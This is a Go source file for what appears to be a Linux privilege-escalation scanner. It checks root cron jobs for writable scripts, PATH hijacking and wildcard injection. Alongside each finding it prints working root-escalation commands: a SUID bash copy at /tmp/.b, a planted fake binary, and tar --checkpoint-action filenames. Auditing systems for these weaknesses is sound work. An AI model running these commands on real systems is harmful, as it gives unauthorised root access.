package scan

import (
	"os"
	"path/filepath"
	"strings"
)

// CronCheck finds root cron jobs that can be hijacked: writable target scripts,
// commands invoked by relative name while a writable directory is on the cron
// PATH, and wildcard arguments to abusable binaries. It only reads files and
// probes write access; it never edits a cron job.
type CronCheck struct{}

func (CronCheck) Name() string { return "cron" }

var cronDirs = []string{
	"/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly",
}

// shell builtins / non-binaries that shouldn't be treated as PATH-hijackable.
var cronBuiltins = map[string]bool{
	"cd": true, "echo": true, "test": true, "true": true, "false": true,
	"exit": true, "set": true, "export": true, "read": true, "[": true,
}

// binaries whose wildcard arguments are classically abusable.
var wildcardBins = map[string]bool{
	"tar": true, "rsync": true, "chown": true, "chmod": true,
	"7z": true, "7za": true, "zip": true,
}

func (cr *CronCheck) Detect(c *Context) []Finding {
	var findings []Finding
	seen := map[string]bool{}
	add := func(key string, f Finding) {
		if seen[key] {
			return
		}
		seen[key] = true
		findings = append(findings, f)
	}

	// Scripts dropped in the periodic cron directories all run as root.
	for _, dir := range cronDirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			p := filepath.Join(dir, e.Name())
			if writable(p) {
				add(p, writableCronFinding(cr.Name(), p, "root-run cron script is writable: "+p))
			}
		}
	}

	// System crontab and /etc/cron.d entries (these carry a user field).
	files := []string{"/etc/crontab"}
	if g, err := filepath.Glob("/etc/cron.d/*"); err == nil {
		files = append(files, g...)
	}
	for _, f := range files {
		content, err := os.ReadFile(f)
		if err != nil {
			continue
		}
		text := string(content)
		writablePATH := writablePathDirs(text)

		for _, line := range strings.Split(text, "\n") {
			// (a) absolute target paths that are writable
			for _, p := range extractAbsPaths(line) {
				if info, err := os.Stat(p); err == nil && info.Mode().IsRegular() && writable(p) {
					add(p, writableCronFinding(cr.Name(), p, "referenced by "+f+" and writable: "+strings.TrimSpace(line)))
				}
			}

			// (b) PATH-hijack and wildcard injection on root entries
			user, cmd, ok := parseCronEntry(line)
			if !ok || (user != "" && user != "root") {
				continue
			}
			if first := firstCmdToken(cmd); first != "" && !strings.HasPrefix(first, "/") &&
				!cronBuiltins[first] && len(writablePATH) > 0 {
				add(f+"|path|"+first, Finding{
					Check:       cr.Name(),
					Title:       "Root cron runs '" + first + "' by relative name with a writable PATH dir",
					Category:    "cron",
					Confidence:  ConfMedium,
					BlastRadius: BlastReversible,
					Evidence:    f + ": " + strings.TrimSpace(line) + "  (writable PATH: " + strings.Join(writablePATH, ", ") + ")",
					Command:     "# plant '" + first + "' earlier in PATH than the real binary:\n#   printf '#!/bin/sh\\ncp /bin/bash /tmp/.b; chmod +s /tmp/.b\\n' > " + writablePATH[0] + "/" + first + "; chmod +x " + writablePATH[0] + "/" + first + "\n# wait for the cron tick, then: /tmp/.b -p",
					Reference:   "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-path",
				})
			}
			if bin, has := wildcardAbusable(cmd); has {
				add(f+"|wild|"+bin, Finding{
					Check:       cr.Name(),
					Title:       "Root cron uses '" + bin + "' with a wildcard — possible wildcard injection",
					Category:    "cron",
					Confidence:  ConfMedium,
					BlastRadius: BlastReversible,
					Evidence:    f + ": " + strings.TrimSpace(line),
					Command:     wildcardCommand(bin),
					Reference:   "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-using-a-script-with-a-wildcard-wildcard-injection",
				})
			}
		}
	}
	return findings
}

func writableCronFinding(check, path, evidence string) Finding {
	return Finding{
		Check:       check,
		Title:       "Writable file run by root cron: " + path,
		Category:    "cron",
		Confidence:  ConfHigh,
		BlastRadius: BlastReversible,
		Evidence:    evidence,
		Command:     "# back up " + path + ", append a root payload, e.g.:\n#   echo 'cp /bin/bash /tmp/.b && chmod +s /tmp/.b' >> " + path + "\n# wait for the schedule, then:  /tmp/.b -p",
		Reference:   "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs",
	}
}

// extractAbsPaths returns the absolute-path tokens on a cron line (skipping
// comments and PATH=/MAILTO= style assignments). Pure function for testability.
func extractAbsPaths(line string) []string {
	line = strings.TrimSpace(line)
	if line == "" || strings.HasPrefix(line, "#") {
		return nil
	}
	var paths []string
	for _, tok := range strings.Fields(line) {
		if strings.HasPrefix(tok, "/") && !strings.Contains(tok, "=") {
			paths = append(paths, tok)
		}
	}
	return paths
}

// parseCronEntry extracts (user, command) from a system-crontab / cron.d line,
// handling both 5-field numeric schedules and @-shortcuts. Pure function.
func parseCronEntry(line string) (user, command string, ok bool) {
	l := strings.TrimSpace(line)
	if l == "" || strings.HasPrefix(l, "#") || strings.Contains(firstField(l), "=") {
		return "", "", false
	}
	fields := strings.Fields(l)
	if strings.HasPrefix(fields[0], "@") { // @reboot user cmd...
		if len(fields) < 3 {
			return "", "", false
		}
		return fields[1], strings.Join(fields[2:], " "), true
	}
	if len(fields) < 7 { // m h dom mon dow user cmd...
		return "", "", false
	}
	return fields[5], strings.Join(fields[6:], " "), true
}

func firstField(l string) string {
	f := strings.Fields(l)
	if len(f) == 0 {
		return ""
	}
	return f[0]
}

// firstCmdToken returns the first real command token of a cron command, skipping
// leading VAR=value assignments.
func firstCmdToken(cmd string) string {
	for _, tok := range strings.Fields(cmd) {
		if strings.Contains(tok, "=") {
			continue
		}
		return tok
	}
	return ""
}

// writablePathDirs returns the absolute directories on a cron file's PATH= line
// that the current user can write to.
func writablePathDirs(text string) []string {
	var dirs []string
	for _, line := range strings.Split(text, "\n") {
		l := strings.TrimSpace(line)
		if !strings.HasPrefix(l, "PATH=") {
			continue
		}
		val := strings.Trim(strings.TrimPrefix(l, "PATH="), "\"'")
		for _, d := range strings.Split(val, ":") {
			if strings.HasPrefix(d, "/") && writable(d) {
				dirs = append(dirs, d)
			}
		}
	}
	return dirs
}

// wildcardAbusable reports an abusable binary used with a wildcard argument.
func wildcardAbusable(cmd string) (string, bool) {
	if !strings.Contains(cmd, "*") {
		return "", false
	}
	for _, tok := range strings.Fields(cmd) {
		if wildcardBins[baseName(tok)] {
			return baseName(tok), true
		}
	}
	return "", false
}

func wildcardCommand(bin string) string {
	if bin == "tar" {
		return "# in the wildcard's working dir (needs write access):\n#   echo 'cp /bin/bash /tmp/.b; chmod +s /tmp/.b' > runme.sh\n#   touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh runme.sh'\n# after the cron runs:  /tmp/.b -p"
	}
	return "# " + bin + " with a wildcard in a writable dir: plant filenames that become option flags (e.g. chown/chmod --reference, rsync -e) to run a payload as root"
}
